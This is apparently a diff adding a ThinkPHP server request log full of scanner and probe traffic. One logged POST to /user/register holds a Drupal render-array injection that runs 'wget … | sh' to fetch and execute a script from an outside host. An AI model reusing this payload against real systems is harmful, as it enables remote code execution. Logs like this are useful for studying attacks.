@@ -1,0 +1,1814 @@
+[ 2018-04-15T01:39:20+08:00 ] 172.16.252.49 103.78.140.3 GET /user/register
+[ log ] www.example.com/user/register [运行时间：0.005138s][吞吐率：194.63req/s] [内存消耗：312.80kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'register',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.example.com',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T01:44:07+08:00 ] 172.16.252.49 115.74.83.18 GET /
+[ log ] 118.31.23.98/ [运行时间：0.011666s][吞吐率：85.72req/s] [内存消耗：477.28kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004029s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_9d4gb2vguq3fqkdt6ols3hv866' AND session_expire > '1523727847' [ RunTime:0.002861s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T01:44:16+08:00 ] 172.16.252.49 115.74.83.18 GET /
+[ log ] 118.31.23.98/ [运行时间：0.010586s][吞吐率：94.46req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003538s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_dc2p7ft185kfe3pcguibgq09e4' AND session_expire > '1523727856' [ RunTime:0.002446s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T02:10:01+08:00 ] 172.16.252.49 211.23.154.138 GET /cms/web/
+[ log ] 118.31.23.98/cms/web/ [运行时间：0.003963s][吞吐率：252.33req/s] [内存消耗：313.45kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cms',
+    1 => 'web',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T02:23:47+08:00 ] 172.16.252.49 39.108.16.1 GET /
+[ log ] 47.96.37.240:2049/ [运行时间：0.009063s][吞吐率：110.34req/s] [内存消耗：476.97kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.96.37.240:2049',
+  'connection' => 'Close',
+  'accept-encoding' => 'identity',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002705s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_4ckl69d3mgpsihfsp4tqjfr955' AND session_expire > '1523730227' [ RunTime:0.001899s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T02:37:15+08:00 ] 172.16.252.49 212.227.102.100 GET /user/register
+[ log ] www.example.com/user/register [运行时间：0.003842s][吞吐率：260.27req/s] [内存消耗：312.80kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'register',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.example.com',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T03:24:46+08:00 ] 172.16.252.49 54.214.142.44 GET /
+[ log ] 118.31.23.98/ [运行时间：0.011270s][吞吐率：88.73req/s] [内存消耗：477.28kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004356s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_5vfbtt8qfklis26bgk3r8gbrp0' AND session_expire > '1523733886' [ RunTime:0.002355s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T03:24:47+08:00 ] 172.16.252.49 54.214.142.44 POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
+[ log ] 118.31.23.98/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax [运行时间：0.004427s][吞吐率：225.89req/s] [内存消耗：315.90kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'register',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+  'host' => '118.31.23.98',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '181',
+)
+[ info ] [ PARAM ] array (
+  'element_parents' => 'account/mail/#value',
+  'ajax_form' => '1',
+  '_wrapper_format' => 'drupal_ajax',
+  'form_id' => 'user_register_form',
+  '_drupal_ajax' => '1',
+  'mail' => 
+  array (
+    '#post_render' => 
+    array (
+      0 => 'exec',
+    ),
+    '#type' => 'markup',
+    '#markup' => 'wget -qO - http://54.39.23.28/1sh | sh',
+  ),
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T03:24:47+08:00 ] 172.16.252.49 54.214.142.44 GET /
+[ log ] 118.31.23.98/ [运行时间：0.008432s][吞吐率：118.60req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002551s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_futvpcgij2e0tponb28vii4ng0' AND session_expire > '1523733887' [ RunTime:0.001856s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T03:24:53+08:00 ] 172.16.252.49 54.214.142.44 GET /
+[ log ] 118.31.23.98/ [运行时间：0.010465s][吞吐率：95.56req/s] [内存消耗：477.27kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'keep-alive' => '300',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'host' => '118.31.23.98',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003652s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_rnmk0t4qqivjd0o3t82mp9k5v2' AND session_expire > '1523733893' [ RunTime:0.002564s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T03:50:24+08:00 ] 172.16.252.49 67.23.43.217 GET /user/register
+[ log ] www.example.com/user/register [运行时间：0.004240s][吞吐率：235.86req/s] [内存消耗：312.80kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'register',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.example.com',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T04:01:05+08:00 ] 172.16.252.49 80.82.78.50 GET http://www.baidu.com/cache/global/img/gs.gif
+[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.003921s][吞吐率：255.03req/s] [内存消耗：313.31kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cache',
+    1 => 'global',
+    2 => 'img',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.baidu.com',
+  'user-agent' => 'Mozilla',
+  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T05:35:44+08:00 ] 172.16.252.49 186.67.182.198 GET /user/register
+[ log ] www.example.com/user/register [运行时间：0.003772s][吞吐率：265.11req/s] [内存消耗：312.80kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'register',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.example.com',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:05+08:00 ] 172.16.252.49 47.97.62.186 GET /
+[ log ] 118.31.23.98/ [运行时间：0.009035s][吞吐率：110.68req/s] [内存消耗：478.11kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98:80',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002807s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_nslc3cmda5qeluop9i3kt84pe5' AND session_expire > '1523746325' [ RunTime:0.001976s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:05+08:00 ] 172.16.252.49 47.97.62.186 GET /login.html
+[ log ] 118.31.23.98/login.html [运行时间：0.004884s][吞吐率：204.75req/s] [内存消耗：479.14kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'login',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98:80',
+  'cookie' => 'PHPSESSID=nslc3cmda5qeluop9i3kt84pe5',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\sea\controller\Login->index[ /var/www/sea/application/sea/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/sea/application/sea/view/page/login.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:05+08:00 ] 172.16.252.49 47.97.62.186 GET /explicit_not_exist_path
+[ log ] 118.31.23.98/explicit_not_exist_path [运行时间：0.003509s][吞吐率：284.98req/s] [内存消耗：314.72kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'explicit_not_exist_path',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/explicit_not_exist_path',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:06+08:00 ] 172.16.252.49 47.97.62.186 GET /index.html
+[ log ] 118.31.23.98/index.html [运行时间：0.011058s][吞吐率：90.43req/s] [内存消耗：483.45kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/index.html',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004089s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_hua633vh57ugt5bsu2vj7jpm73' AND session_expire > '1523746326' [ RunTime:0.002807s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:06+08:00 ] 172.16.252.49 47.97.62.186 GET /login.html
+[ log ] 118.31.23.98/login.html [运行时间：0.004903s][吞吐率：203.96req/s] [内存消耗：479.17kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'login',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/index.html',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\sea\controller\Login->index[ /var/www/sea/application/sea/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/sea/application/sea/view/page/login.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:07+08:00 ] 172.16.252.49 47.97.62.186 GET /index.php
+[ log ] 118.31.23.98/index.php [运行时间：0.010141s][吞吐率：98.61req/s] [内存消耗：478.42kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'index',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/index.php',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'sea',
+  'type' => 'driver\\session\\Mysql',
+  'auto_start' => true,
+  'table_name' => 's_session',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003385s ] mysql:dbname=yuhal;host=118.31.23.98;port=3306;charset=utf8
+[ sql ] [ SQL ] SELECT session_data FROM yh_s_session WHERE session_id = 'think_hua633vh57ugt5bsu2vj7jpm73' AND session_expire > '1523746327' [ RunTime:0.002529s ]
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:07+08:00 ] 172.16.252.49 47.97.62.186 GET /index.php/login.html
+[ log ] 118.31.23.98/index.php/login.html [运行时间：0.004758s][吞吐率：210.17req/s] [内存消耗：474.14kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sea',
+    1 => 'login',
+    2 => 'index',
+  ),
+  'convert' => false,
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/index.php',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\sea\controller\Login->index[ /var/www/sea/application/sea/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/sea/application/sea/view/page/login.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:07+08:00 ] 172.16.252.49 47.97.62.186 GET /index.jsp
+[ log ] 118.31.23.98/index.jsp [运行时间：0.004128s][吞吐率：242.25req/s] [内存消耗：315.20kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index.jsp',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/index.jsp',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:08+08:00 ] 172.16.252.49 47.97.62.186 GET /admin/
+[ log ] 118.31.23.98/admin/ [运行时间：0.003641s][吞吐率：274.66req/s] [内存消耗：315.18kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/admin/',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:08+08:00 ] 172.16.252.49 47.97.62.186 GET /favicon.ico
+[ log ] 118.31.23.98/favicon.ico [运行时间：0.003759s][吞吐率：266.03req/s] [内存消耗：315.23kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/favicon.ico',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:08+08:00 ] 172.16.252.49 47.97.62.186 GET /readme.html
+[ log ] 118.31.23.98/readme.html [运行时间：0.003478s][吞吐率：287.52req/s] [内存消耗：315.23kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'readme',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'referer' => 'http://118.31.23.98/readme.html',
+  'cookie' => 'PHPSESSID=hua633vh57ugt5bsu2vj7jpm73',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-04-15T06:52:09+08:00 ] 172.16.252.49 47.97.62.186 GET /license.txt
+[ log ] 118.31.23.98/license.txt [运行时间：0.003589s][吞吐率：278.64req/s] [内存消耗：315.23kb] [文件加载：27]
+[ info ] [ LANG ] /var/www/sea/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'license.txt',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '118.31.23.98',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
